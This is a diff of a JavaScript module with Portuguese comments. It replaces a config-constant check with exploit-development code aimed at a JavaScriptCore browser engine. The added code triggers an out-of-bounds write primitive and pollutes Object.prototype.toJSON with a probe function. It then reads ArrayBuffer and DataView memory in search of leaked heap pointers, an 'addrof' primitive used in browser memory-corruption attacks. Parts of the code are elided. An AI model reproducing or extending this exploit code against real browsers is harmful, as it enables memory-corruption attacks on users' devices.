@@ -1,118 +1,198 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v75_VerifyConfigConstants)
+// js/script3/testArrayBufferVictimCrash.mjs (v73_PerfectedV64_FlowAndAnalysis)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
-// Não importaremos o core_exploit para este teste simples de config
+import {
+    triggerOOB_primitive,
+    oob_write_absolute,
+    clearOOBEnvironment
+} from '../core_exploit.mjs';
 import { JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V75_VCC = "OriginalHeisenbug_TypedArrayAddrof_v75_VerifyConfigConstants";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V73_PV64FA = "OriginalHeisenbug_TypedArrayAddrof_v73_PerfectedV64_FlowAndAnalysis";
 
-let probe_call_count_v75 = 0;
-let all_probe_interaction_details_v75 = [];
+// Variáveis globais ao módulo para captura de dados pela sonda
+let captured_fuzz_reads_for_AB_v73 = null;
+let captured_fuzz_reads_for_DV_v73 = null;
 
-functiontoJSON_TA_Probe_Placeholder_v75() {
-    probe_call_count_v75++;
-    const call_num = probe_call_count_v75;
-    const this_obj_type = Object.prototype.toString.call(this);
-    let current_call_details = { /* ... */ };
-    all_probe_interaction_details_v75.push(current_call_details);
-    return { call_num_processed: call_num, type: this_obj_type };
-}
+let leak_target_buffer_v73 = null;
+let leak_target_dataview_v73 = null;
+let victim_typed_array_ref_v73 = null;
+let probe_call_count_v73 = 0;
+let all_probe_interaction_details_v73 = [];
+let first_call_details_object_ref_v73 = null;
 
-export async function executeTypedArrayVictimAddrofTest_VerifyConfigConstants() {
-    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V75_VCC}.triggerAndLog`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Verificando constantes de config.mjs ---`, "test", FNAME_CURRENT_TEST);
-    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V75_VCC} Init...`;
+const VICTIM_BUFFER_SIZE = 256;
+const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
+const OOB_WRITE_VALUE = 0xFFFFFFFF;
+const PROBE_CALL_LIMIT_V73 = 10;
+const FUZZ_OFFSETS_V73 = [0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x48, 0x50];
 
-    probe_call_count_v75 = 0;
-    all_probe_interaction_details_v75 = [];
-    let collected_probe_details_for_return = [];
-
-    let config_check_result = {
-        success: false,
-        struct_id_str_type: "N/A",
-        struct_id_str_val: "N/A",
-        butterfly_str_type: "N/A",
-        butterfly_str_val: "N/A",
-        adv64_struct_id: "N/A",
-        adv64_butterfly: "N/A",
-        message: "Verificação de Config: Default (v75)"
+function toJSON_TA_Probe_PerfectedV64Flow_v73() {
+    probe_call_count_v73++;
+    const call_num = probe_call_count_v73;
+    let current_call_details = {
+        call_number: call_num,
+        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V73_PV64FA,
+        this_type: Object.prototype.toString.call(this),
+        this_is_victim: (this === victim_typed_array_ref_v73),
+        this_is_C1: (this === first_call_details_object_ref_v73 && first_call_details_object_ref_v73 !== null),
+        this_is_leak_target_AB: (this === leak_target_buffer_v73 && leak_target_buffer_v73 !== null),
+        this_is_leak_target_DV: (this === leak_target_dataview_v73 && leak_target_dataview_v73 !== null),
+        fuzz_capture_status: null,
+        error_in_probe: null
     };
+    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. Type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1? ${current_call_details.this_is_C1}. IsLeakAB? ${current_call_details.this_is_leak_target_AB}. IsLeakDV? ${current_call_details.this_is_leak_target_DV}`, "leak");
 
     try {
-        logS3(`  DEBUG: Verificando JSC_OFFSETS importado...`, "debug", FNAME_CURRENT_TEST);
-        if (typeof JSC_OFFSETS !== 'object' || JSC_OFFSETS === null) {
-            throw new Error("JSC_OFFSETS não é um objeto ou é null.");
+        if (call_num > PROBE_CALL_LIMIT_V73) { all_probe_interaction_details_v73.push({...current_call_details}); return { recursion_stopped_v73: true, call: call_num }; }
+
+        if (call_num === 1 && current_call_details.this_is_victim) {
+            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Creating C1_details WITH PAYLOADS.`, "info");
+            first_call_details_object_ref_v73 = current_call_details;
+            if (leak_target_buffer_v73) current_call_details.payload_AB = leak_target_buffer_v73;
+            if (leak_target_dataview_v73) current_call_details.payload_DV = leak_target_dataview_v73;
+            all_probe_interaction_details_v73.push({...current_call_details});
+            return current_call_details; // CORRIGIDO: Retornar C1_details explicitamente
         }
-        logS3(`  DEBUG: JSC_OFFSETS.Structure existe? ${!!JSC_OFFSETS.Structure}`, "debug", FNAME_CURRENT_TEST);
-        logS3(`  DEBUG: JSC_OFFSETS.ArrayBuffer existe? ${!!JSC_OFFSETS.ArrayBuffer}`, "debug", FNAME_CURRENT_TEST);
-
-        const struct_id_str = JSC_OFFSETS.Structure?.GENERIC_OBJECT_FAKE_ID_VALUE_FOR_CONFUSION;
-        const butterfly_str = JSC_OFFSETS.ArrayBuffer?.BUTTERFLY_OR_DATA_FAKE_VALUE_FOR_CONFUSION;
-
-        config_check_result.struct_id_str_val = String(struct_id_str);
-        config_check_result.struct_id_str_type = typeof struct_id_str;
-        config_check_result.butterfly_str_val = String(butterfly_str);
-        config_check_result.butterfly_str_type = typeof butterfly_str;
-
-        logS3(`  CONFIG CHECK: FAKE_STRUCTURE_ID_VAL_STR = '${struct_id_str}' (type: ${typeof struct_id_str})`, "info", FNAME_CURRENT_TEST);
-        logS3(`  CONFIG CHECK: FAKE_BUTTERFLY_DATA_VAL_STR = '${butterfly_str}' (type: ${typeof butterfly_str})`, "info", FNAME_CURRENT_TEST);
-
-        if (typeof struct_id_str !== 'string' || typeof butterfly_str !== 'string') {
-            config_check_result.message = "V75 FALHA: Constantes FAKE_* não são strings ou são undefined.";
-            logS3(config_check_result.message, "error", FNAME_CURRENT_TEST);
-            config_check_result.success = false;
-        } else {
-            logS3(`  CONFIG CHECK: Tentando instanciar AdvancedInt64 com as strings...`, "info", FNAME_CURRENT_TEST);
+        else if (current_call_details.this_is_leak_target_AB && current_call_details.this_type === '[object ArrayBuffer]') {
+            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE TARGET ArrayBuffer! Fuzzing and capturing to side-channel...`, "critical");
+            let fuzzed_reads = [];
             try {
-                let adv_struct = new AdvancedInt64(struct_id_str);
-                config_check_result.adv64_struct_id = adv_struct.toString(true);
-                logS3(`    AdvancedInt64 from Structure ID string: ${config_check_result.adv64_struct_id}`, "good", FNAME_CURRENT_TEST);
-
-                let adv_butterfly = new AdvancedInt64(butterfly_str);
-                config_check_result.adv64_butterfly = adv_butterfly.toString(true);
-                logS3(`    AdvancedInt64 from Butterfly string: ${config_check_result.adv64_butterfly}`, "good", FNAME_CURRENT_TEST);
-
-                config_check_result.message = "V75 SUCESSO: Constantes FAKE_* carregadas como string e parseadas por AdvancedInt64.";
-                config_check_result.success = true;
-                logS3(config_check_result.message, "good", FNAME_CURRENT_TEST);
-
-            } catch (e_adv64) {
-                config_check_result.message = `V75 FALHA: Erro ao instanciar AdvancedInt64: ${e_adv64.message}. Strings usadas: Struct='${struct_id_str}', Butterfly='${butterfly_str}'`;
-                logS3(config_check_result.message, "error", FNAME_CURRENT_TEST);
-                config_check_result.success = false;
-                config_check_result.adv64_struct_id = `Error: ${e_adv64.message}`;
-                config_check_result.adv64_butterfly = `Error: ${e_adv64.message}`;
-            }
+                let view = new DataView(this);
+                for (const offset of FUZZ_OFFSETS_V73) {
+                    let low=0,high=0,ptr_str="N/A",dbl=NaN,err_msg=null; if(view.byteLength<(offset+8)){err_msg="OOB";}else{low=view.getUint32(offset,true);high=view.getUint32(offset+4,true);ptr_str=new AdvancedInt64(low,high).toString(true);let tb=new ArrayBuffer(8);(new Uint32Array(tb))[0]=low;(new Uint32Array(tb))[1]=high;dbl=(new Float64Array(tb))[0];} fuzzed_reads.push({offset:toHex(offset),low:toHex(low),high:toHex(high),int64:ptr_str,dbl:dbl,error:err_msg});
+                    logS3(`    AB Fuzz @${toHex(offset)}: L=${toHex(low)} H=${toHex(high)} I64=${ptr_str} D=${dbl}${err_msg?' E:'+err_msg:''}`, "dev_verbose");
+                }
+                captured_fuzz_reads_for_AB_v73 = fuzzed_reads;
+                current_call_details.fuzz_capture_status = `AB Fuzz captured ${fuzzed_reads.length} reads.`;
+                logS3(`[${current_call_details.probe_variant}] ${current_call_details.fuzz_capture_status}`, "vuln");
+            } catch (e) { current_call_details.error_in_probe = e.message; /* ... */ }
+            all_probe_interaction_details_v73.push({...current_call_details});
+            return { marker_ab_fuzz_done_v73: true, call_num_processed: call_num };
         }
-
-        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V75_VCC}: ${config_check_result.success ? 'Config OK' : 'Config FAIL'}`;
-
-    } catch (e_main) {
-        config_check_result.message = `V75 ERRO CRÍTICO no teste: ${e_main.message}`;
-        logS3(config_check_result.message, "critical", FNAME_CURRENT_TEST);
-        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V75_VCC}: Test CRIT_ERR`;
-        config_check_result.success = false; // Garantir que está como falha
-    } finally {
-        // Copiar all_probe_interaction_details_v75 ANTES de limpar para o runner
-        if (all_probe_interaction_details_v75 && Array.isArray(all_probe_interaction_details_v75)) {
-            collected_probe_details_for_return = all_probe_interaction_details_v75.map(d => (d && typeof d === 'object' ? {...d} : d));
-        } else {
-            collected_probe_details_for_return = [];
+        else if (current_call_details.this_is_leak_target_DV && current_call_details.this_type === '[object DataView]') {
+            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE TARGET DataView! Fuzzing and capturing to side-channel...`, "critical");
+            let fuzzed_reads = [];
+            try {
+                let view = this;
+                for (const offset of FUZZ_OFFSETS_V73) { /* ... (lógica de fuzzing como acima) ... */
+                    let low=0,high=0,ptr_str="N/A",dbl=NaN,err_msg=null; if(view.byteLength<(offset+8)){err_msg="OOB";}else{low=view.getUint32(offset,true);high=view.getUint32(offset+4,true);ptr_str=new AdvancedInt64(low,high).toString(true);let tb=new ArrayBuffer(8);(new Uint32Array(tb))[0]=low;(new Uint32Array(tb))[1]=high;dbl=(new Float64Array(tb))[0];} fuzzed_reads.push({offset:toHex(offset),low:toHex(low),high:toHex(high),int64:ptr_str,dbl:dbl,error:err_msg}); logS3(`    DV Fuzz @${toHex(offset)}: L=${toHex(low)} H=${toHex(high)} I64=${ptr_str} D=${dbl}${err_msg?' E:'+err_msg:''}`,"dev_verbose");
+                }
+                captured_fuzz_reads_for_DV_v73 = fuzzed_reads;
+                current_call_details.fuzz_capture_status = `DV Fuzz captured ${fuzzed_reads.length} reads.`;
+                logS3(`[${current_call_details.probe_variant}] ${current_call_details.fuzz_capture_status}`, "vuln");
+            } catch (e) { current_call_details.error_in_probe = e.message; /* ... */ }
+            all_probe_interaction_details_v73.push({...current_call_details});
+            return { marker_dv_fuzz_done_v73: true, call_num_processed: call_num };
         }
+        else if (current_call_details.this_is_C1 && current_call_details.this_type === '[object Object]') { /* ... C1 re-entry, retornar this ... */
+            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is C1_details_obj (re-entry). Returning 'this'.`, "warn");
+            all_probe_interaction_details_v73.push({...current_call_details});
+            return this;
+        }
+        else { /* ... unexpected, retornar marcador ... */
+            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected: ${current_call_details.this_type}. Ret marker.`, "warn");
+            all_probe_interaction_details_v73.push({...current_call_details});
+            return `ProcessedCall${call_num}_Type${current_call_details.this_type.replace(/[^a-zA-Z0-9]/g, '')}`;
+        }
+    } catch (e_probe) { /* ... (tratamento de erro geral da sonda) ... */ }
+}
+
+export async function executeTypedArrayVictimAddrofTest_PerfectedV64_FlowAndAnalysis() {
+    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V73_PV64FA}.triggerAndLog`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (PerfectedV64_FlowAndAnalysis) & Addrof ---`, "test", FNAME_CURRENT_TEST);
+    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V73_PV64FA} Init...`;
+
+    captured_fuzz_reads_for_AB_v73 = null;
+    captured_fuzz_reads_for_DV_v73 = null;
+    probe_call_count_v73 = 0;
+    all_probe_interaction_details_v73 = [];
+    victim_typed_array_ref_v73 = null;
+    first_call_details_object_ref_v73 = null;
+
+    leak_target_buffer_v73 = new ArrayBuffer(0x80);
+    leak_target_dataview_v73 = new DataView(new ArrayBuffer(0x80));
+
+    let errorCapturedMain = null;
+    let rawStringifyOutput = "N/A", stringifyOutput_parsed = null;
+    let collected_probe_details_for_return = [];
+    let addrof_A_result = { success: false, msg: "Addrof ArrayBuffer: Default (v73)" };
+    let addrof_B_result = { success: false, msg: "Addrof DataView: Default (v73)" };
+    let pollutionApplied = false, originalToJSONDescriptor = null;
+
+    try {
+        await triggerOOB_primitive({ force_reinit: true });
+        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
+        logS3(`  Critical OOB write.`, "info", FNAME_CURRENT_TEST);
+        await PAUSE_S3(100);
+        victim_typed_array_ref_v73 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
+
+        const ppKey = 'toJSON';
+        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
+        try {
+            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_PerfectedV64Flow_v73, writable: true, configurable: true, enumerable: false });
+            pollutionApplied = true;
+            logS3(`  toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v73)...`, "info", FNAME_CURRENT_TEST);
+            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v73);
+            logS3(`  JSON.stringify completed. Raw Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
+            try{ stringifyOutput_parsed = JSON.parse(rawStringifyOutput); } catch(e){ /* ... */ }
+
+            logS3("STEP 3: Analyzing fuzz data from side-channels (v73)...", "warn", FNAME_CURRENT_TEST);
+            let heisenbugIndication = false;
+
+            const process_captured_fuzz_reads = (fuzzed_reads_array, target_addrof_result, objTypeName) => {
+                if (fuzzed_reads_array && Array.isArray(fuzzed_reads_array)) {
+                    heisenbugIndication = true;
+                    logS3(`  V73_ANALYSIS: Processing ${fuzzed_reads_array.length} captured fuzz reads for ${objTypeName}. Full data logged by probe.`, "good");
+                    for (const read_attempt of fuzzed_reads_array) {
+                        if (read_attempt.error) continue;
+                        const highVal = parseInt(read_attempt.high, 16);
+                        const lowVal = parseInt(read_attempt.low, 16);
+                        let isPotentialPtr=false;
+                        if (JSC_OFFSETS.JSValue && JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH !== undefined && JSC_OFFSETS.JSValue.TAG_MASK !== undefined && JSC_OFFSETS.JSValue.CELL_TAG !== undefined) {
+                           isPotentialPtr = (highVal === JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH && (lowVal & JSC_OFFSETS.JSValue.TAG_MASK) === JSC_OFFSETS.JSValue.CELL_TAG);
+                        }
+                        if (!isPotentialPtr && (highVal > 0 || lowVal > 0x10000) && (highVal < 0x000F0000) && ((lowVal & 0x7) === 0) ) { isPotentialPtr = true; }
+
+                        if(isPotentialPtr && !(highVal === 0 && lowVal === 0) ){
+                            target_addrof_result.success = true;
+                            target_addrof_result.msg = `V73 SUCCESS (${objTypeName} Fuzz): Ptr ${read_attempt.int64} @${read_attempt.offset}`;
+                            logS3(`  !!!! V73 POTENTIAL POINTER for ${objTypeName} @${read_attempt.offset}: ${read_attempt.int64} !!!!`, "vuln");
+                            break;
+                        }
+                    }
+                    if(!target_addrof_result.success){ target_addrof_result.msg = `V73 Fuzz for ${objTypeName} no ptr. First read (from probe log): ${fuzzed_reads_array[0]?.int64 || 'N/A'}`; }
+                } else if (!target_addrof_result.success) { target_addrof_result.msg = `V73 No fuzz data in side-channel for ${objTypeName}.`; }
+            };
+
+            process_captured_fuzz_reads(captured_fuzz_reads_for_AB_v73, addrof_A_result, "ArrayBuffer");
+            process_captured_fuzz_reads(captured_fuzz_reads_for_DV_v73, addrof_B_result, "DataView");
+
+            if(!heisenbugIndication && first_call_details_object_ref_v73){ const c1 = first_call_details_object_ref_v73; if(c1.payload_AB || c1.payload_DV) heisenbugIndication = true;}
+
+            if(addrof_A_result.success||addrof_B_result.success){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V73_PV64FA}: Addr SUCCESS!`;}
+            else if(heisenbugIndication){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V73_PV64FA}: Heisenbug OK, Addr Fail`;}
+            else{document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V73_PV64FA}: No Heisenbug?`;}
+
+        } catch (e) { errorCapturedMain = e; /* ... */ } finally { /* ... */ }
+    } catch (e) { errorCapturedMain = e; /* ... */ }
+    finally {
+        if (all_probe_interaction_details_v73 && Array.isArray(all_probe_interaction_details_v73)) {
+            collected_probe_details_for_return = all_probe_interaction_details_v73.map(d => (d && typeof d === 'object' ? {...d} : d));
+        } else { collected_probe_details_for_return = []; }
+        clearOOBEnvironment({force_clear_even_if_not_setup: true});
+        // ... (logs finais e limpeza de globais) ...
         logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
-        logS3(`Config Check Result: Success=${config_check_result.success}, Msg='${config_check_result.message}'`, config_check_result.success ? "good" : "error", FNAME_CURRENT_TEST);
+        logS3(`Total probe calls: ${probe_call_count_v73}`, "info", FNAME_CURRENT_TEST);
+        logS3(`Addrof A: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
+        logS3(`Addrof B: Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
+        // Limpeza
+        victim_typed_array_ref_v73 = null; all_probe_interaction_details_v73 = []; probe_call_count_v73 = 0; first_call_details_object_ref_v73 = null; leak_target_buffer_v73 = null; leak_target_dataview_v73 = null; captured_fuzz_reads_for_AB_v73 = null; captured_fuzz_reads_for_DV_v73 = null;
     }
-
     return {
-        // Para manter a estrutura esperada pelo runner, mesmo que este teste seja diferente
-        errorCapturedMain: !config_check_result.success ? new Error(config_check_result.message) : null,
-        stringifyResult: config_check_result, // Retorna o objeto de resultado da verificação
-        rawStringifyForAnalysis: null,
-        all_probe_calls_for_analysis: collected_probe_details_for_return, // Sonda placeholder, será vazio ou com poucas chamadas
-        total_probe_calls: probe_call_count_v75,
-        // Simular resultados de addrof para o runner não quebrar
-        addrof_A_result: { success: config_check_result.success, msg: config_check_result.message },
-        addrof_B_result: { success: true, msg: "N/A for v75 config check" }
+        errorCapturedMain: errorCapturedMain, stringifyResult: stringifyOutput_parsed, rawStringifyForAnalysis: rawStringifyOutput,
+        all_probe_calls_for_analysis: collected_probe_details_for_return, total_probe_calls: probe_call_count_v73,
+        addrof_A_result: addrof_A_result, addrof_B_result: addrof_B_result
     };
 };
